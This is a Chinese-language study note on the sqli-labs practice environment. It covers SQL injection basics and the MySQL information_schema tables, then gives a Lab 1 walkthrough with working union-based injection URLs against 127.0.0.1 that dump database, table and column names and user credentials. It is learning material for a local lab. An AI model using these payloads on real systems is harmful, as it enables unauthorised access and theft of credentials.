# Sqli-Lab

+ 想刷JS挑战题的时候发现，还是得先学SQL注入啊！

## 基本信息

+ **url编码**：一般的url编码其实就是那个字符的ASCII值得十六进制，再在前面加个%，具体可以看<http://www.w3school.com.cn/tags/html_ref_urlencode.html>常用的写出来吧： 空格是%20，单引号是%27， 井号是%23(用来注释)，双引号是%22
+ sql注入的基本步骤
  + 判断是什么类型注入，有没过滤了关键字，可否绕过
  + 获取数据库用户，版本，当前连接的数据库等信息
  + 获取某个数据库表的信息
  + 获取列信息
  + 最后就获取数据了
+ **为了方便学习查看，可以在源码中的$sql下一句语句写以下php语句（就是输出拿到数据库查询的完整语句是怎么样的）**

```
echo "你的 sql 语句是：".$sql."<br>";
```

+ information_schema -- 系统数据库，记录当前数据库的数据库，表，列，用户权限等信息

  + SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。
+ TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表
  + COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。 
+ 详情：<http://wenku.baidu.com/link?url=bIA38Slp-g2Bob4VDuTSVY8e04Beqq9Xac4I90UMC9ziQuzxiukpEh5abPK-woB9tuQ4DuY_KhKW-eTHH6ACSiMJmRhctiHvijOEFmENBbS>

## Lab1 

+ 第一题可能是最挑战的把，毕竟从0到1，好好记笔记
+ 输入?id=1'发现报错 -- 存在SQL注入
+ 利用order by确定这张表中的字段数
+ 于是在注入的地方使其报错，然后注入自己想要的语句，在把后面的limit 0,1给注释掉

```mysql
1' order by 3 --+ //得到列数为3， --+是为了注释后面的语句

//1. 先利用union语句查询哪些是可以显示在网页上的
1' union select 1,2,3%23//发现第二个和第三个才会显示到网页上

//所以让第一行查询的结果为空，union右边的查询结果就自然成为了第一行
-1' union select 1,2,3%23

//因为能显示的位置只有2个，远远不够，所以我们需要用到concat()个concat_ws()函数
select concat_ws(':',1,2,3)//结果为1:2:3
concat_ws第一个参数相当于分隔符，然而一般我们需要把第一个参数用mysql的char函数将十进制ASCII码转换成字符，不然会被h	tml编码，这里熟练使用以下语句即可！
select concat_ws(char(32,58,32),user(),database(),version())//user返回当前数据库连接用户，database()返回当前数据库使用的数据库，version()返回当前数据库的版本

http://127.0.0.1/sqli/Less-1/?id=-1%27%20union%20select%201,2,concat_ws(char(32,58,32),user(),database(),version())%23
-->2. 返回当前用户，数据库及其版本

http://127.0.0.1/sqli/Less-1/?id=0%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata%23
-->3. 返回当前数据库的所有数据库名

http://127.0.0.1/sqli/Less-1/?id=0%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22%23
注意security数据库名需要用单引号引起来
或者
http://127.0.0.1/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x7365637572697479%23
区别在于'security'变成了十六进制
-->4. 获取当前数据库中的所有表

http://127.0.0.1/sqli/Less-1/?id=0%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%22security%22%20and%20table_name=%22users%22%23
-->5. 获取需要的表中的id名字

http://127.0.0.1/sqli/Less-1/?id=0%27%20union%20select%201,2,group_concat(concat_ws(char(32,58,32),id,username,password))%20from%20security.users%23
-->6. 获取user表中的3个字段

//这里-1是为了查询一个不存在的id好让第一句结果为空直接显示第二句的结果
-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+ // 得到数据库名

-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= 'security'# //得到表名

-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name= 'users'# //得到列名

-1' union select 1,username,password from users where id=3# //爆破得到数据
```

+ group_concat的作用：把一列列显示的名字变成一行
+ union的作用：连接多个select语句，有重复的会删除

